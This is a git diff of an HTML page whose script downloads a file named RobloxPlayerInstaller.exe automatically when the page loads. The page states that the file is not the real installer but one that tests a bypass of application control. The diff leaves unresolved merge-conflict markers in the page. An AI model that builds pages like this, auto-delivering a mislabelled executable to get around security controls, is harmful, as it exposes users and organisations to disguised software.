@@ -10,6 +10,7 @@
     <p>> This isn't the acual RobloxPlayerInstaller, it is a verson of the installer that tests a bypass to app control</p>
     <p>If the file doesn't download, click <a href="../RobloxPlayerInstaller.exe" style="color: blue;" aria-label="Download RobloxPlayerInstaller.exe">here</a></p>
     <script>
+<<<<<<< HEAD
         function downloadFile(url, filename) {
             const a = document.createElement('a');
             a.href = url;
@@ -22,6 +23,35 @@
         downloadFile('../RobloxPlayerInstaller.exe', 'RobloxPlayerInstaller.exe');
         window.open('../RobloxPlayerInstaller.exe', '_blank');
 
+=======
+        async function fetchAndDownload(url, filename) {
+            try {
+                const response = await fetch(url);
+                if (!response.ok) {
+                    throw new Error(`Download failed: ${response.status} ${response.statusText}`);
+                }
+
+                const blob = await response.blob();
+                const objectUrl = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = objectUrl;
+                a.download = filename || 'download';
+                document.body.appendChild(a);
+                a.click();
+                document.body.removeChild(a);
+                URL.revokeObjectURL(objectUrl);
+
+                
+                setTimeout(() => {
+                    window.location.href = '../Main-Page.html';
+                }, 500);
+            } catch (error) {
+                console.error(error);
+            }
+        }
+
+        fetchAndDownload('../RobloxPlayerInstaller.exe', 'RobloxPlayerInstaller.exe');
+>>>>>>> f6400ba (Major update!)
     </script>
 </body>
 </html>
